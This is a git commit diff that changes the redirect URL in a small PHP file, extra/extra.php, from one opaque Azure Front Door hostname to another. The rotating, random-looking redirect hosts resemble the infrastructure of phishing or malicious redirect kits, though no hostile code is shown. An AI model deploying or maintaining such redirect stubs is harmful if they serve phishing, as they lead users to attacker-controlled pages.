3ae5f159b6109f7b3280de9b1ef644da9dad0a35
billwartd <billwartd@gmail.com>
2026-06-30 13:58:37 +0530

    extra.php

--- extra/extra.php
+++ extra/extra.php
@@ -1,6 +1,6 @@
 <?php
 // You can set your redirect URL here
-$url = "https://deamexdhf4dxfcdu-default-origin-groupp-dcc2gfbrcvbtcebr.z03.azurefd.net";
+$url = "https://dcc2gfbrcvbtcebrcdu-default-origin-group-e2c5cjf7dqh0e9fj.z03.azurefd.net";
 ?>
 
 <!DOCTYPE html>
